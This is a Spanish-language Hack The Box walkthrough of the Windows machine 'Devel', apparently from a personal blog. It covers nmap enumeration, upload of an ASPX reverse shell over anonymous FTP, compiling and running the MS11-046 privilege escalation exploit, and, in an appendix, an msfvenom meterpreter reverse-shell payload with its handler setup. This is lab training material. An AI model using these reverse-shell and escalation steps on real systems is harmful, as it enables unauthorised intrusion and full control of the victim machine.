---
layout: single
title: Devel - Hack The Box
excerpt: "Devel es una maquina windows que se explota mediante un servicio FTP que tiene subida arbitraria de archivos, por medio de esta debilidad, se logra establecer una conexión al equipo victima y ejecutar comandos, luego se logra escalar privilegios por medio de un exploit conocido basado en la versión del sistema operativo."
date: 2021-10-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-devel/devel-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:
  - ftp
  - windows
  - arbitrary file upload
---

![](/assets/images/htb-writeup-devel/devel-logo.png)


Esta es una maquina de nivel facil segun hack the box, donde por medio de un servicio FTP se logra subir archivos que permiten ganar acceso al sistema.

## Enumeración
vamos a comenzar enumerando el sistema con nmap para descubrir puertos y servicios corriendo en dichos puertos

```
nmap -sC -sV 10.10.10.5
```

el escaneo de nmap nos reporta los puertos 21(ftp) y 80(http) abiertos

```
Nmap scan report for 10.10.10.5
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

nmap fue capaz de identificar que el puerto 21 permite logearse con el usuario "Anonymous", el cual no se necesita contraseña para ingresar. 

# Acceso y explotación

Nos conectamos al servicio FTP
```
ftp 10.10.10.5
```
y observamos 3 archivos

![](/assets/images/htb-writeup-devel/devel1.png)


Si navegamos por el puerto 80, veremos la imagen clasica del servicio IIS de windows, sin embargo, al entrar al servicio FTP está la misma imagen (welcome.png) que nos muestra mediante el puerto 80. Por lo que una vía pontencial de explotación es intentar subir una reverse shell.

Buscando en internet "aspx reverse shell github" encontramos una que nos sirve

![](/assets/images/htb-writeup-devel/devel2.png)


por lo que la descargamos en nuestra maquina de atacante 

![](/assets/images/htb-writeup-devel/devel3.png)


y cambiamos la IP y puerto local a la que nos queremos conectar.

![](/assets/images/htb-writeup-devel/devel6.png)


ahora, nos conectamos al servicio FTP (FTP IP-VICTIMA) y ejecutamos el siguiente comando para subir nuestra shell que acabamos de descargar
```
put shell.aspx
```

una vez subida, nos tendremos que poner en escucha con netcat

![](/assets/images/htb-writeup-devel/devel7.png)


y ejecutamos el archivo que subimos desde la web

![](/assets/images/htb-writeup-devel/devel5.png)


y ya logramos ganar acceso al sistema

![](/assets/images/htb-writeup-devel/devel4.png)


# Escalada de privilegios
Una vez ganado acceso el sistema, podemos ver ante que SO nos estamos enfrentando, con el comando
```
systeminfo
```

Según la información del SO, estamos ante un Windows 7 6.1.7600

![](/assets/images/htb-writeup-devel/devel8.png)


buscando en internet un exploit para esta versión, encontramos uno, asi que vamos a probarlo

![](/assets/images/htb-writeup-devel/devel9.png)


Para ejecutar este exploit, primero necesita ser compilado
```
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
```

*Nota:* en caso de que no tengas la utilidad *mingw-w64* (la cual sirve para compilar exploits de windows en linux) puedes instalarla con el siguiente comando
```
sudo apt-get install mingw-w64
```

ahora solo queda subir el exploit mediante FTP y ejecutarlo en la maquina victima. Nota: cuando ingresemos por FTP, debemos ejecutar el comando "binary" dado que se suelen perder datos de archivos al subirlo, con este comando hacemos que se suba intacto.

![](/assets/images/htb-writeup-devel/devel10.png)


una vez subido, nos dirigimos a la ruta C:\inetpub\wwwroot y ejecutamos el exploit que acabamos de subir, y nos convertimos en el usuario **nt authority\system**

![](/assets/images/htb-writeup-devel/devel11.png)



 
# Anexos

## shell con metasploit
creamos el payload
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.16.6 lport=4444 -f aspx -o shell.aspx
```

nos ponemos en escucha
1. ```msfconsole```
2. ```use exploit/multi/handler```
3. ```set payload windows/meterpreter/reverse_tcp```
4. ```set lhost 10.10.16.6```
5. ```set lport 1234```
6. ```run```


## Pseudo consola para ejecución de comandos
Parrot y Kali linux traen una pseudo consola para en lenguaje aspx que nos permite ejecutar comandos, para encontrla podemos escribir el siguiente comando
```
locate cmdasp.aspx
```

este archivo lo subimos mediante FTP y tendremos ejecución de comandos, para luego establecer una reverse shell a nuestro equipo.
